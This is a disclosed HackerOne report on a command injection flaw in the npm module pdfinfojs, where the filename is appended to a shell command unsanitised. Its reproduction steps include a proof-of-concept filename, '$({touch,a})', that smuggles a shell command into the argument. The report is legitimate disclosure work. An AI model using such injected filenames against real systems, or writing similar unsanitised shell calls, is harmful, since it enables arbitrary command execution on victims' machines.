---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '330957'
original_report_id: '330957'
title: '[pdfinfojs] Command Injection on filename parameter'
weakness: Command Injection - Generic
team_handle: nodejs-ecosystem
created_at: '2018-03-29T01:18:13.084Z'
disclosed_at: '2018-04-19T07:31:54.253Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 15
asset_identifier: pdfinfojs
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- command-injection-generic
---

# [pdfinfojs] Command Injection on filename parameter

## Metadata

- HackerOne Report ID: 330957
- Weakness: Command Injection - Generic
- Program: nodejs-ecosystem
- Disclosed At: 2018-04-19T07:31:54.253Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hello , there is a Command Injection vulnerability on the "pdfinfojs" module.

# Module

**module name:** pdfinfojs
**version:** 0.3.6
**npm page:** https://www.npmjs.com/package/pdfinfojs

## Module Description

> pdfinfo shell wrapper for Node.js

## Module Stats

10 downloads in the last day
61 downloads in the last week
106 downloads in the last month

# Vulnerability

## Vulnerability Description

> The module appends the filename parameter to the command on the lines [28](https://github.com/fagbokforlaget/pdfinfojs/blob/master/lib/pdfinfo.js#L28), [47](https://github.com/fagbokforlaget/pdfinfojs/blob/master/lib/pdfinfo.js#L47) and [72](https://github.com/fagbokforlaget/pdfinfojs/blob/master/lib/pdfinfo.js#L72) without parsing the user input, thus leading to a Command Injection. 

## Steps To Reproduce:

* Install the module 

```
$ npm install pdfinfojs
```

* Example code, similar to the documentation, with the malicious filename `$({touch,a})` :

```javascript
var pdfinfo = require('pdfinfojs'),
    pdf = new pdfinfo('$({touch,a})'); // Malicious payload

pdf.getInfo(function(err, info, params) {
  if (err) {
    console.error(err.stack);
  }
  else {
    console.log(info); //info is an object
    console.log(params); // commandline params passed to pdfinfo cmd
  }
});
```

*there are a lot of possibles payloads to achieve this, used this brace expansion just because space in the file name sucks*

* Run the code 

```
$ node index.js
Error
    ... it throws an error, but the execution is successful
```
* Check the newly created file 

```
$ ls
a		index.js
```

## Patch

It is advisable to use a module that explicitly isolates the parameters to the `pdfinfo` command.

## Tested on :

- macOS Sierra 10.12.16
- NODEJS v8.4.0
- NPM 5.3.0

**( contacted the maintainer || opened issue ) = False**

## Impact

An attacker can execute arbitrary commands on the victim's machine

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
